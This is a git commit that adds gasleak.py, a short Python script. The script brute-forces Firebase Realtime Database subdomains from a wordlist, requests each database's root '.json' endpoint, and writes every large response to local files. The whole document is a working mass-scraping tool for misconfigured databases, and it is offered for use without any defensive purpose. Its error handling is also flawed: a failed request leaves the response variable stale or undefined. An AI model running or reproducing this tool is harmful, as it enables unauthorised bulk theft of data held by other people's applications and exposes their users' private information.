cd19452330148d3dd041c4029cedc653bdcd2577
Jaggar Henry <55773558+jaggarhenry@users.noreply.github.com>
2020-06-11 23:45:21 -0400

    Initial file upload

---
+++ gasleak.py
@@ -0,0 +1,35 @@
+import requests
+
+
+#minimum amount of characters a database should have
+RESPONSE_THRESHOLD = 1000
+
+#subdomain wordlist
+wordlist = "demo_wordlist.txt"
+
+
+
+#read word list from file
+for line in open("wordlists/%s" % wordlist, "r").readlines():
+
+	#prepare URL
+	word = line.rstrip()
+	url = "https://%s.firebaseio.com/.json" % word
+
+
+
+	#request the database
+	try:
+		response = requests.get(url).text
+
+	#in case the request fails, ignore
+	except Exception as e:
+		pass
+
+
+
+	#only store if meets the size threshold
+	if len(response) >= RESPONSE_THRESHOLD:
+
+		with open("database/" + word, "w+") as file:
+			file.write(response)
